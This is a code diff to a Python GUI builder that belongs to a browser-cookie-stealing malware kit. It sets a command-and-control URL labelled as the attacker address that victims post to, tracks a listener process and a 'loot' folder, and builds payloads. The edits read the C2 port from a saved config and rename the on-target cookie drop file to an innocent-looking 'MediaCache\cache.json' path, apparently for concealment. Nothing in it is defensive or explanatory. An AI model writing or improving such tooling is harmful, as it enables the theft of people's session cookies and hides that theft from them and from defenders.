@@ -169,6 +169,15 @@ def load_list():
         except Exception: pass
     return []
 
+def saved_port():
+    """C2 port saved by auto.py in config.json -- pick.py used to hardcode 9090,
+    which embedded a C2 URL pointing at a port where nothing was listening."""
+    try:
+        with open(os.path.join(HERE, "config.json"), encoding="utf-8") as f:
+            return int(json.load(f).get("port") or 9090)
+    except Exception:
+        return 9090
+
 def save_list():
     with open(LIST, "w", encoding="utf-8") as f: json.dump(ROWS, f, indent=1)
 
@@ -244,7 +253,7 @@ def run(path, sink, kill, purge, timeout, extra, log=print):
             log("    -> %s" % TXTF)
         else:
             log("[-] no cookies received")
-            log("    fallback: C:\\ProgramData\\cookielog\\drop.json")
+            log("    fallback on the target: C:\\ProgramData\\MediaCache\\cache.json")
         if sink and SINK_PROC["proc"] and SINK_PROC["proc"].poll() is None:
             log("[*] sink.py still listening (pid=%d)" % SINK_PROC["proc"].pid)
 
@@ -548,7 +557,7 @@ def gui():
     # discard invalid IPs (169.254.x.x = APIPA, 0.0.0.0)
     if _local_ip.startswith("0.") or _local_ip.startswith("169.254."):
         _local_ip = "127.0.0.1"
-    c2var = tk.StringVar(value="http://%s:9090/" % _local_ip)
+    c2var = tk.StringVar(value="http://%s:%d/" % (_local_ip, saved_port()))
     c2entry = ttk.Entry(c2f, textvariable=c2var, width=40)
     c2entry.pack(side="left", fill="x", expand=True)
     ttk.Label(c2f, text="(attacker IP -- victim posts here)", style="Dim.TLabel").pack(side="left", padx=(6,0))
@@ -614,7 +623,7 @@ def gui():
         if os.path.isdir(LOOT): os.startfile(LOOT)
         else: L("[-] loot/ folder does not exist")
     def open_drop():
-        drop = r"C:\ProgramData\cookielog\drop.json"
+        drop = r"C:\ProgramData\MediaCache\cache.json"
         if os.path.exists(drop): os.startfile(drop)
         else: L("[-] no drop.json (payload used C2 HTTP or pipe)")
     def do_build():
